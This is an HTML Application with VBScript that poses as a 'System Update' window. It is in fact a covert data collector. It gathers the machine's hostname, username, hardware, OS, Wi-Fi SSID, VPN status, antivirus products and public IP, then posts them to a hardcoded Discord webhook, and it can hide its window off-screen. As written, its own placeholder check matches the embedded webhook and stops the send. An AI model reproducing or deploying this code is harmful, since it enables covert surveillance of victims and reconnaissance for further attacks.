<!DOCTYPE html>
<html>
<head>
    <hta:application 
        id="oHTA" 
        applicationname="SysUpdate" 
        border="none" 
        caption="no" 
        showintaskbar="no" 
        windowstate="normal"
        scroll="no"
    />
    <title>System Update</title>
</head>
<body style="background-color: black; color: lime; font-family: Consolas, monospace; font-size: 11px; padding: 10px;">
    <div id="status">Initializing...</div>
    
    <script language="VBScript">
        Option Explicit
        
        ' === CONFIGURATION ===
        Const WEBHOOK_URL = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
        Const DEBUG_MODE = True  ' Set to False to hide window completely
        
        Sub Window_OnLoad
            If Not DEBUG_MODE Then
                window.resizeTo 1, 1
                window.moveTo -5000, -5000
            Else
                window.resizeTo 600, 400
            End If
            
            UpdateStatus "Starting data collection..."
            Call Main()
        End Sub
        
        Sub UpdateStatus(msg)
            If DEBUG_MODE Then
                document.getElementById("status").innerHTML = document.getElementById("status").innerHTML & "<br>> " & msg
            End If
        End Sub
        
        Function EscapeJSON(str)
            On Error Resume Next
            If IsNull(str) Or IsEmpty(str) Then
                EscapeJSON = "null"
                Exit Function
            End If
            
            Dim result
            result = CStr(str)
            
            ' Escape backslashes first
            result = Replace(result, "\", "\\")
            ' Escape quotes
            result = Replace(result, """", "\""")
            ' Escape newlines
            result = Replace(result, vbCr, "\r")
            result = Replace(result, vbLf, "\n")
            result = Replace(result, vbCrLf, "\n")
            ' Escape tabs
            result = Replace(result, vbTab, "\t")
            
            EscapeJSON = result
        End Function
        
        Function GetCPUInfo()
            On Error Resume Next
            Dim wmi, colItems, objItem, result
            result = "WMI_Error"
            
            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
            If Err.Number <> 0 Then
                GetCPUInfo = "WMI_Connect_Failed"
                Exit Function
            End If
            
            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_Processor", "WQL", 48)
            If Err.Number <> 0 Then
                GetCPUInfo = "Query_Failed"
                Exit Function
            End If
            
            For Each objItem In colItems
                result = Trim(objItem.Name)
                If result <> "" Then Exit For
            Next
            
            If result = "" Then result = "Unknown_CPU"
            GetCPUInfo = result
        End Function
        
        Function GetGPUInfo()
            On Error Resume Next
            Dim wmi, colItems, objItem, result
            result = ""
            
            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_VideoController WHERE Name IS NOT NULL")
            
            For Each objItem In colItems
                If Trim(objItem.Name) <> "" Then
                    result = result & Trim(objItem.Name) & " | "
                End If
            Next
            
            If result = "" Then result = "Unknown_GPU"
            If Len(result) > 200 Then result = Left(result, 200) & "..."
            
            GetGPUInfo = result
        End Function
        
        Function GetNetworkInfo()
            On Error Resume Next
            Dim wmi, colItems, objItem, ssid, vpnStatus
            ssid = "No_WiFi"
            vpnStatus = "false"
            
            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
            
            ' Get VPN status from network adapters
            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
            For Each objItem In colItems
                Dim adapterName
                adapterName = LCase(Trim(objItem.Name))
                If InStr(adapterName, "vpn") > 0 OR InStr(adapterName, "virtual") > 0 OR InStr(adapterName, "tunnel") > 0 OR InStr(adapterName, "tap") > 0 Then
                    vpnStatus = "true: " & Left(objItem.Name, 30)
                End If
            Next
            
            ' Get SSID using netsh
            Dim shell, exec, line
            Set shell = CreateObject("WScript.Shell")
            Set exec = shell.Exec("netsh wlan show interfaces")
            
            Do While Not exec.StdOut.AtEndOfStream
                line = exec.StdOut.ReadLine()
                If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
                    Dim pos
                    pos = InStr(line, ":")
                    If pos > 0 Then
                        ssid = Trim(Mid(line, pos + 1))
                    End If
                End If
            Loop
            
            Set exec = Nothing
            Set shell = Nothing
            
            GetNetworkInfo = ssid & "|" & vpnStatus
        End Function
        
        Function GetAVInfo()
            On Error Resume Next
            Dim wmi, colItems, objItem, result
            result = ""
            
            ' Try SecurityCenter2 first (Windows Vista+)
            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2")
            If Err.Number = 0 Then
                Set colItems = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
                For Each objItem In colItems
                    result = result & objItem.displayName & " | "
                Next
            End If
            
            If result = "" Then
                ' Try SecurityCenter (XP/older)
                Err.Clear
                Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter")
                If Err.Number = 0 Then
                    Set colItems = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
                    For Each objItem In colItems
                        result = result & objItem.companyName & " " & objItem.displayName & " | "
                    Next
                End If
            End If
            
            If result = "" Then result = "Windows_Defender_Or_None"
            If Len(result) > 150 Then result = Left(result, 150)
            
            GetAVInfo = result
        End Function
        
        Function GetPublicIP()
            On Error Resume Next
            Dim http, result
            result = "IP_Fetch_Failed"
            
            Set http = CreateObject("Microsoft.XMLHTTP")
            If Err.Number <> 0 Then
                Set http = CreateObject("MSXML2.XMLHTTP")
            End If
            If Err.Number <> 0 Then
                Set http = CreateObject("MSXML2.ServerXMLHTTP")
            End If
            
            http.Open "GET", "https://api.ipify.org", False
            http.Send
            
            If http.Status = 200 Then
                result = Trim(http.ResponseText)
            Else
                result = "HTTP_" & http.Status
            End If
            
            Set http = Nothing
            GetPublicIP = result
        End Function
        
        Function GetSystemInfo()
            On Error Resume Next
            Dim wmi, colItems, objItem, os, ram
            os = "Unknown"
            ram = "Unknown"
            
            Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
            Set colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
            
            For Each objItem In colItems
                os = Trim(objItem.Caption)
                ram = Round(objItem.TotalVisibleMemorySize / 1048576, 2) & "GB"
                Exit For
            Next
            
            GetSystemInfo = os & "|" & ram
        End Function
        
        Sub Main()
            On Error Resume Next
            Dim cpu, gpu, netInfo, ssid, vpn, av, ip, sysInfo, os, ram
            Dim hostname, username
            
            ' Validate webhook
            If InStr(WEBHOOK_URL, "YOUR_") > 0 OR InStr(WEBHOOK_URL, "webhooks/15023") > 0 Then
                UpdateStatus "ERROR: You must replace WEBHOOK_URL with your actual Discord webhook!"
                If DEBUG_MODE Then MsgBox "Replace the webhook URL!", 16, "Configuration Error"
                Exit Sub
            End If
            
            UpdateStatus "Collecting CPU info..."
            cpu = GetCPUInfo()
            UpdateStatus "CPU: " & Left(cpu, 50)
            
            UpdateStatus "Collecting GPU info..."
            gpu = GetGPUInfo()
            UpdateStatus "GPU: " & Left(gpu, 50)
            
            UpdateStatus "Collecting network info..."
            netInfo = GetNetworkInfo()
            ssid = Split(netInfo, "|")(0)
            vpn = Split(netInfo, "|")(1)
            UpdateStatus "SSID: " & ssid
            UpdateStatus "VPN: " & vpn
            
            UpdateStatus "Collecting AV info..."
            av = GetAVInfo()
            UpdateStatus "AV: " & Left(av, 50)
            
            UpdateStatus "Fetching public IP..."
            ip = GetPublicIP()
            UpdateStatus "IP: " & ip
            
            UpdateStatus "Collecting system info..."
            sysInfo = GetSystemInfo()
            os = Split(sysInfo, "|")(0)
            ram = Split(sysInfo, "|")(1)
            
            hostname = CreateObject("WScript.Network").ComputerName
            username = CreateObject("WScript.Network").UserName
            
            UpdateStatus "Building payload..."
            
            ' Build JSON
            Dim payload
            payload = "{"
            payload = payload & """embeds"":[{"
            payload = payload & """title"":""🖥️ " & EscapeJSON(hostname) & ""","
            payload = payload & """description"":""User: " & EscapeJSON(username) & ""","
            payload = payload & """color"":3447003,"
            payload = payload & """fields"":["
            
            payload = payload & "{""name"":""🌐 IP Address"",""value"":""" & EscapeJSON(ip) & """,""inline"":true},"
            payload = payload & "{""name"":""💾 RAM"",""value"":""" & EscapeJSON(ram) & """,""inline"":true},"
            payload = payload & "{""name"":""⚡ CPU"",""value"":""" & EscapeJSON(Left(cpu, 100)) & """,""inline"":false},"
            payload = payload & "{""name"":""🎮 GPU"",""value"":""" & EscapeJSON(Left(gpu, 100)) & """,""inline"":false},"
            payload = payload & "{""name"":""📶 SSID"",""value"":""" & EscapeJSON(ssid) & """,""inline"":true},"
            payload = payload & "{""name"":""🔒 VPN"",""value"":""" & EscapeJSON(vpn) & """,""inline"":true},"
            payload = payload & "{""name"":""🛡️ Antivirus"",""value"":""" & EscapeJSON(Left(av, 100)) & """,""inline"":false},"
            payload = payload & "{""name"":""💻 OS"",""value"":""" & EscapeJSON(Left(os, 100)) & """,""inline"":false}"
            
            payload = payload & "],"
            payload = payload & """footer"":{""text"":""HTA v2.0 | " & Now & """}"
            payload = payload & "}]}"
            
            UpdateStatus "Payload size: " & Len(payload) & " chars"
            UpdateStatus "Sending to Discord..."
            
            ' Send webhook
            Dim http, status
            Set http = CreateObject("Microsoft.XMLHTTP")
            
            http.Open "POST", WEBHOOK_URL, False
            http.setRequestHeader "Content-Type", "application/json"
            http.send payload
            
            status = http.Status
            UpdateStatus "HTTP Status: " & status
            
            If status = 204 Then
                UpdateStatus "SUCCESS! Message sent."
                If DEBUG_MODE Then MsgBox "Data sent successfully!", 64, "Success"
            ElseIf status = 0 Then
                UpdateStatus "ERROR: Cannot connect (status 0)"
                UpdateStatus "Check internet connection"
                If DEBUG_MODE Then MsgBox "Cannot connect to Discord. Check internet.", 16, "Connection Failed"
            ElseIf status = 404 Then
                UpdateStatus "ERROR: Webhook not found (404)"
                UpdateStatus "Check your webhook URL"
                If DEBUG_MODE Then MsgBox "Webhook URL is invalid (404)", 16, "Invalid Webhook"
            ElseIf status = 429 Then
                UpdateStatus "ERROR: Rate limited (429)"
                If DEBUG_MODE Then MsgBox "Too many requests. Wait a minute.", 16, "Rate Limited"
            Else
                UpdateStatus "ERROR: HTTP " & status
                UpdateStatus "Response: " & Left(http.responseText, 100)
                If DEBUG_MODE Then MsgBox "Failed with status: " & status, 16, "Error"
            End If
            
            Set http = Nothing
            
            If Not DEBUG_MODE Then
                window.close()
            Else
                UpdateStatus "<br>Done. Close window manually."
            End If
        End Sub
    </script>
</body>
</html>
